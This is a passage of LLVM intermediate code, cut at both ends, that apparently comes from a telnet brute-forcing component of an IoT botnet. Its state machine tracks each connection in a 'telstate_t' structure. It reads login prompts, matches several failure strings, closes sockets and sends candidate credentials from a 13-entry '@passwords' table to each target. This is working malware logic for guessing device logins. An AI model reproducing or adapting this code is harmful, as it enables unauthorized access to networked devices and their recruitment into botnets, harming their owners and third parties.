  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 2
  store i8 0, i8* %744, align 8
  %745 = load i32, i32* %2, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %746
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %747, i32 0, i32 3
  store i8 1, i8* %748, align 1
  br label %2311

749:                                              ; preds = %709
  %750 = load i32, i32* %2, align 4
  %751 = sext i32 %750 to i64
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %751
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %752, i32 0, i32 0
  %754 = load i32, i32* %753, align 16
  %755 = call i64 @send(i32 %754, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384)
  %756 = icmp slt i64 %755, 0
  br i1 %756, label %757, label %772

757:                                              ; preds = %749
  %758 = load i32, i32* %2, align 4
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %759
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %760, i32 0, i32 0
  %762 = load i32, i32* %761, align 16
  %763 = call i32 @sclose(i32 %762)
  %764 = load i32, i32* %2, align 4
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %765
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %766, i32 0, i32 2
  store i8 0, i8* %767, align 8
  %768 = load i32, i32* %2, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 3
  store i8 1, i8* %771, align 1
  br label %2311

772:                                              ; preds = %749
  %773 = load i32, i32* %2, align 4
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %774
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %775, i32 0, i32 2
  store i8 4, i8* %776, align 8
  br label %2310

777:                                              ; preds = %70
  %778 = load i32, i32* %2, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %779
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %780, i32 0, i32 6
  %782 = load i32, i32* %781, align 4
  %783 = icmp eq i32 %782, 0
  br i1 %783, label %784, label %791

784:                                              ; preds = %777
  %785 = call i64 @time(i64* null) #12
  %786 = trunc i64 %785 to i32
  %787 = load i32, i32* %2, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %788
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %789, i32 0, i32 6
  store i32 %786, i32* %790, align 4
  br label %791

791:                                              ; preds = %784, %777
  %792 = load i32, i32* %2, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %793
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %794, i32 0, i32 0
  %796 = load i32, i32* %795, align 16
  %797 = load i32, i32* %2, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 8
  %801 = load i8*, i8** %800, align 8
  %802 = load i32, i32* %2, align 4
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 7
  %806 = load i16, i16* %805, align 16
  %807 = zext i16 %806 to i32
  %808 = call i32 @readUntil(i32 %796, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %801, i32 1024, i32 %807)
  %809 = icmp ne i32 %808, 0
  br i1 %809, label %810, label %842

810:                                              ; preds = %791
  %811 = load i32, i32* %2, align 4
  %812 = sext i32 %811 to i64
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %812
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %813, i32 0, i32 6
  store i32 0, i32* %814, align 4
  %815 = load i32, i32* %2, align 4
  %816 = sext i32 %815 to i64
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %816
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %817, i32 0, i32 7
  store i16 0, i16* %818, align 16
  %819 = load i32, i32* %2, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 8
  %823 = load i8*, i8** %822, align 8
  %824 = call i8* @strstr(i8* %823, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0)) #11
  %825 = icmp ne i8* %824, null
  br i1 %825, label %826, label %831

826:                                              ; preds = %810
  %827 = load i32, i32* %2, align 4
  %828 = sext i32 %827 to i64
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %828
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %829, i32 0, i32 2
  store i8 5, i8* %830, align 8
  br label %836

831:                                              ; preds = %810
  %832 = load i32, i32* %2, align 4
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %833
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %834, i32 0, i32 2
  store i8 7, i8* %835, align 8
  br label %836

836:                                              ; preds = %831, %826
  %837 = load i32, i32* %2, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %838
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %839, i32 0, i32 8
  %841 = load i8*, i8** %840, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %841, i8 0, i64 1024, i1 false)
  br label %2311

842:                                              ; preds = %791
  %843 = load i32, i32* %2, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 0
  %847 = load i32, i32* %846, align 16
  %848 = load i32, i32* %2, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 8
  %852 = load i8*, i8** %851, align 8
  %853 = load i32, i32* %2, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 7
  %857 = load i16, i16* %856, align 16
  %858 = zext i16 %857 to i32
  %859 = call i32 @readUntil(i32 %847, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %852, i32 1024, i32 %858)
  %860 = icmp ne i32 %859, 0
  br i1 %860, label %861, label %893

861:                                              ; preds = %842
  %862 = load i32, i32* %2, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 6
  store i32 0, i32* %865, align 4
  %866 = load i32, i32* %2, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %867
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %868, i32 0, i32 7
  store i16 0, i16* %869, align 16
  %870 = load i32, i32* %2, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %871
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %872, i32 0, i32 8
  %874 = load i8*, i8** %873, align 8
  %875 = call i8* @strstr(i8* %874, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0)) #11
  %876 = icmp ne i8* %875, null
  br i1 %876, label %877, label %882

877:                                              ; preds = %861
  %878 = load i32, i32* %2, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 2
  store i8 5, i8* %881, align 8
  br label %887

882:                                              ; preds = %861
  %883 = load i32, i32* %2, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %884
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %885, i32 0, i32 2
  store i8 7, i8* %886, align 8
  br label %887

887:                                              ; preds = %882, %877
  %888 = load i32, i32* %2, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %889
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %890, i32 0, i32 8
  %892 = load i8*, i8** %891, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %892, i8 0, i64 1024, i1 false)
  br label %2311

893:                                              ; preds = %842
  %894 = load i32, i32* %2, align 4
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %895
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %896, i32 0, i32 8
  %898 = load i8*, i8** %897, align 8
  %899 = call i8* @strstr(i8* %898, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #11
  %900 = icmp ne i8* %899, null
  br i1 %900, label %901, label %916

901:                                              ; preds = %893
  %902 = load i32, i32* %2, align 4
  %903 = sext i32 %902 to i64
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %903
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %904, i32 0, i32 0
  %906 = load i32, i32* %905, align 16
  %907 = call i32 @sclose(i32 %906)
  %908 = load i32, i32* %2, align 4
  %909 = sext i32 %908 to i64
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %909
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %910, i32 0, i32 2
  store i8 0, i8* %911, align 8
  %912 = load i32, i32* %2, align 4
  %913 = sext i32 %912 to i64
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %913
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %914, i32 0, i32 3
  store i8 0, i8* %915, align 1
  br label %2311

916:                                              ; preds = %893
  %917 = load i32, i32* %2, align 4
  %918 = sext i32 %917 to i64
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %918
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %919, i32 0, i32 8
  %921 = load i8*, i8** %920, align 8
  %922 = call i8* @strstr(i8* %921, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #11
  %923 = icmp ne i8* %922, null
  br i1 %923, label %924, label %939

924:                                              ; preds = %916
  %925 = load i32, i32* %2, align 4
  %926 = sext i32 %925 to i64
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %926
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %927, i32 0, i32 0
  %929 = load i32, i32* %928, align 16
  %930 = call i32 @sclose(i32 %929)
  %931 = load i32, i32* %2, align 4
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %932
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %933, i32 0, i32 2
  store i8 0, i8* %934, align 8
  %935 = load i32, i32* %2, align 4
  %936 = sext i32 %935 to i64
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %936
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %937, i32 0, i32 3
  store i8 0, i8* %938, align 1
  br label %2311

939:                                              ; preds = %916
  %940 = load i32, i32* %2, align 4
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %941
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %942, i32 0, i32 8
  %944 = load i8*, i8** %943, align 8
  %945 = call i8* @strstr(i8* %944, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #11
  %946 = icmp ne i8* %945, null
  br i1 %946, label %947, label %962

947:                                              ; preds = %939
  %948 = load i32, i32* %2, align 4
  %949 = sext i32 %948 to i64
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %949
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %950, i32 0, i32 0
  %952 = load i32, i32* %951, align 16
  %953 = call i32 @sclose(i32 %952)
  %954 = load i32, i32* %2, align 4
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %955
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %956, i32 0, i32 2
  store i8 0, i8* %957, align 8
  %958 = load i32, i32* %2, align 4
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %959
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %960, i32 0, i32 3
  store i8 0, i8* %961, align 1
  br label %2311

962:                                              ; preds = %939
  %963 = load i32, i32* %2, align 4
  %964 = sext i32 %963 to i64
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %964
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %965, i32 0, i32 8
  %967 = load i8*, i8** %966, align 8
  %968 = call i8* @strstr(i8* %967, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #11
  %969 = icmp ne i8* %968, null
  br i1 %969, label %970, label %985

970:                                              ; preds = %962
  %971 = load i32, i32* %2, align 4
  %972 = sext i32 %971 to i64
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %972
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %973, i32 0, i32 0
  %975 = load i32, i32* %974, align 16
  %976 = call i32 @sclose(i32 %975)
  %977 = load i32, i32* %2, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %978
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %979, i32 0, i32 2
  store i8 0, i8* %980, align 8
  %981 = load i32, i32* %2, align 4
  %982 = sext i32 %981 to i64
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %982
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %983, i32 0, i32 3
  store i8 0, i8* %984, align 1
  br label %2311

985:                                              ; preds = %962
  %986 = load i32, i32* %2, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %987
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %988, i32 0, i32 8
  %990 = load i8*, i8** %989, align 8
  %991 = call i8* @strstr(i8* %990, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #11
  %992 = icmp ne i8* %991, null
  br i1 %992, label %993, label %1008

993:                                              ; preds = %985
  %994 = load i32, i32* %2, align 4
  %995 = sext i32 %994 to i64
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %995
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %996, i32 0, i32 0
  %998 = load i32, i32* %997, align 16
  %999 = call i32 @sclose(i32 %998)
  %1000 = load i32, i32* %2, align 4
  %1001 = sext i32 %1000 to i64
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1001
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1002, i32 0, i32 2
  store i8 0, i8* %1003, align 8
  %1004 = load i32, i32* %2, align 4
  %1005 = sext i32 %1004 to i64
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1005
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1006, i32 0, i32 3
  store i8 0, i8* %1007, align 1
  br label %2311

1008:                                             ; preds = %985
  %1009 = load i32, i32* %2, align 4
  %1010 = sext i32 %1009 to i64
  %1011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1010
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1011, i32 0, i32 8
  %1013 = load i8*, i8** %1012, align 8
  %1014 = call i8* @strstr(i8* %1013, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #11
  %1015 = icmp ne i8* %1014, null
  br i1 %1015, label %1016, label %1031

1016:                                             ; preds = %1008
  %1017 = load i32, i32* %2, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 0
  %1021 = load i32, i32* %1020, align 16
  %1022 = call i32 @sclose(i32 %1021)
  %1023 = load i32, i32* %2, align 4
  %1024 = sext i32 %1023 to i64
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1024
  %1026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1025, i32 0, i32 2
  store i8 0, i8* %1026, align 8
  %1027 = load i32, i32* %2, align 4
  %1028 = sext i32 %1027 to i64
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1028
  %1030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1029, i32 0, i32 3
  store i8 0, i8* %1030, align 1
  br label %2311

1031:                                             ; preds = %1008
  %1032 = load i32, i32* %2, align 4
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1033
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1034, i32 0, i32 8
  %1036 = load i8*, i8** %1035, align 8
  %1037 = call i8* @strstr(i8* %1036, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #11
  %1038 = icmp ne i8* %1037, null
  br i1 %1038, label %1039, label %1054

1039:                                             ; preds = %1031
  %1040 = load i32, i32* %2, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1041
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1042, i32 0, i32 0
  %1044 = load i32, i32* %1043, align 16
  %1045 = call i32 @sclose(i32 %1044)
  %1046 = load i32, i32* %2, align 4
  %1047 = sext i32 %1046 to i64
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1047
  %1049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1048, i32 0, i32 2
  store i8 0, i8* %1049, align 8
  %1050 = load i32, i32* %2, align 4
  %1051 = sext i32 %1050 to i64
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1051
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1052, i32 0, i32 3
  store i8 0, i8* %1053, align 1
  br label %2311

1054:                                             ; preds = %1031
  %1055 = load i32, i32* %2, align 4
  %1056 = sext i32 %1055 to i64
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1056
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1057, i32 0, i32 8
  %1059 = load i8*, i8** %1058, align 8
  %1060 = call i8* @strstr(i8* %1059, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #11
  %1061 = icmp ne i8* %1060, null
  br i1 %1061, label %1062, label %1077

1062:                                             ; preds = %1054
  %1063 = load i32, i32* %2, align 4
  %1064 = sext i32 %1063 to i64
  %1065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1064
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1065, i32 0, i32 0
  %1067 = load i32, i32* %1066, align 16
  %1068 = call i32 @sclose(i32 %1067)
  %1069 = load i32, i32* %2, align 4
  %1070 = sext i32 %1069 to i64
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1070
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1071, i32 0, i32 2
  store i8 0, i8* %1072, align 8
  %1073 = load i32, i32* %2, align 4
  %1074 = sext i32 %1073 to i64
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1074
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1075, i32 0, i32 3
  store i8 0, i8* %1076, align 1
  br label %2311

1077:                                             ; preds = %1054
  %1078 = load i32, i32* %2, align 4
  %1079 = sext i32 %1078 to i64
  %1080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1079
  %1081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1080, i32 0, i32 8
  %1082 = load i8*, i8** %1081, align 8
  %1083 = call i8* @strstr(i8* %1082, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #11
  %1084 = icmp ne i8* %1083, null
  br i1 %1084, label %1085, label %1100

1085:                                             ; preds = %1077
  %1086 = load i32, i32* %2, align 4
  %1087 = sext i32 %1086 to i64
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1087
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1088, i32 0, i32 0
  %1090 = load i32, i32* %1089, align 16
  %1091 = call i32 @sclose(i32 %1090)
  %1092 = load i32, i32* %2, align 4
  %1093 = sext i32 %1092 to i64
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1093
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1094, i32 0, i32 2
  store i8 0, i8* %1095, align 8
  %1096 = load i32, i32* %2, align 4
  %1097 = sext i32 %1096 to i64
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1097
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1098, i32 0, i32 3
  store i8 0, i8* %1099, align 1
  br label %2311

1100:                                             ; preds = %1077
  %1101 = load i32, i32* %2, align 4
  %1102 = sext i32 %1101 to i64
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1102
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1103, i32 0, i32 8
  %1105 = load i8*, i8** %1104, align 8
  %1106 = call i64 @strlen(i8* %1105) #11
  %1107 = trunc i64 %1106 to i16
  %1108 = load i32, i32* %2, align 4
  %1109 = sext i32 %1108 to i64
  %1110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1109
  %1111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1110, i32 0, i32 7
  store i16 %1107, i16* %1111, align 16
  br label %1112

1112:                                             ; preds = %1100
  %1113 = load i32, i32* %2, align 4
  %1114 = sext i32 %1113 to i64
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1114
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1115, i32 0, i32 6
  %1117 = load i32, i32* %1116, align 4
  %1118 = add i32 %1117, 10
  %1119 = zext i32 %1118 to i64
  %1120 = call i64 @time(i64* null) #12
  %1121 = icmp slt i64 %1119, %1120
  br i1 %1121, label %1122, label %1137

1122:                                             ; preds = %1112
  %1123 = load i32, i32* %2, align 4
  %1124 = sext i32 %1123 to i64
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1124
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1125, i32 0, i32 0
  %1127 = load i32, i32* %1126, align 16
  %1128 = call i32 @sclose(i32 %1127)
  %1129 = load i32, i32* %2, align 4
  %1130 = sext i32 %1129 to i64
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1130
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1131, i32 0, i32 2
  store i8 0, i8* %1132, align 8
  %1133 = load i32, i32* %2, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1134
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1135, i32 0, i32 3
  store i8 1, i8* %1136, align 1
  br label %1137

1137:                                             ; preds = %1122, %1112
  br label %2310

1138:                                             ; preds = %70
  %1139 = load i32, i32* %2, align 4
  %1140 = sext i32 %1139 to i64
  %1141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1140
  %1142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1141, i32 0, i32 0
  %1143 = load i32, i32* %1142, align 16
  %1144 = load i32, i32* %2, align 4
  %1145 = sext i32 %1144 to i64
  %1146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1145
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1146, i32 0, i32 5
  %1148 = load i8, i8* %1147, align 1
  %1149 = zext i8 %1148 to i64
  %1150 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1149
  %1151 = load i8*, i8** %1150, align 8
  %1152 = load i32, i32* %2, align 4
  %1153 = sext i32 %1152 to i64
  %1154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1153
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1154, i32 0, i32 5
  %1156 = load i8, i8* %1155, align 1
  %1157 = zext i8 %1156 to i64
  %1158 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1157
  %1159 = load i8*, i8** %1158, align 8
  %1160 = call i64 @strlen(i8* %1159) #11
  %1161 = call i64 @send(i32 %1143, i8* %1151, i64 %1160, i32 16384)
  %1162 = icmp slt i64 %1161, 0
  br i1 %1162, label %1163, label %1178

1163:                                             ; preds = %1138
  %1164 = load i32, i32* %2, align 4
  %1165 = sext i32 %1164 to i64
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1165
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1166, i32 0, i32 0
  %1168 = load i32, i32* %1167, align 16
  %1169 = call i32 @sclose(i32 %1168)
  %1170 = load i32, i32* %2, align 4
  %1171 = sext i32 %1170 to i64
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1171
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1172, i32 0, i32 2
  store i8 0, i8* %1173, align 8
  %1174 = load i32, i32* %2, align 4
  %1175 = sext i32 %1174 to i64
  %1176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1175
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1176, i32 0, i32 3
  store i8 1, i8* %1177, align 1
  br label %2311

1178:                                             ; preds = %1138
  %1179 = load i32, i32* %2, align 4
  %1180 = sext i32 %1179 to i64
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1180
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1181, i32 0, i32 0
  %1183 = load i32, i32* %1182, align 16
  %1184 = call i64 @send(i32 %1183, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384)
  %1185 = icmp slt i64 %1184, 0
  br i1 %1185, label %1186, label %1201

1186:                                             ; preds = %1178
  %1187 = load i32, i32* %2, align 4
  %1188 = sext i32 %1187 to i64
  %1189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1188
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1189, i32 0, i32 0
  %1191 = load i32, i32* %1190, align 16
  %1192 = call i32 @sclose(i32 %1191)
  %1193 = load i32, i32* %2, align 4
  %1194 = sext i32 %1193 to i64
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1194
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1195, i32 0, i32 2
  store i8 0, i8* %1196, align 8
  %1197 = load i32, i32* %2, align 4
  %1198 = sext i32 %1197 to i64
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1198
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1199, i32 0, i32 3
  store i8 1, i8* %1200, align 1
  br label %2311

1201:                                             ; preds = %1178
  %1202 = load i32, i32* %2, align 4
  %1203 = sext i32 %1202 to i64
